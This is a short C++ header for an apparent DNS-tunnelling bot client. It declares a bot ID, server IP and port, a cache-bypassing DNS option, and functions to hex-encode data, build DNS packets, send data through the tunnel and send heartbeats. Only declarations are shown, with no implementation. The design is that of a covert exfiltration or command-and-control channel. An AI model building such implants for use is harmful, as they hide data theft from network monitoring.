#pragma once
#include <string>
#include <winsock2.h>
#include <iomanip>
#include <windns.h>
using namespace std;

extern const char* SERVER_IP;
extern const int SERVER_PORT;
extern const char* BOT_ID;
extern SOCKET clientSocket;
constexpr DWORD dns_options = DNS_QUERY_BYPASS_CACHE + DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE;
inline std::string TARGET = "example.com";

int startConnection(const char* domain);
int sendData(int& id, int& packetNumber, const char* domain, const char* data);
std::string convertToHex(const char* string);


string CreateDNSPacket(const string& jsonData);
bool InitializeConnection();
bool SendDataTunnel(const string& data);
void SendManualInput(const string& content);
void SendHeartbeat();

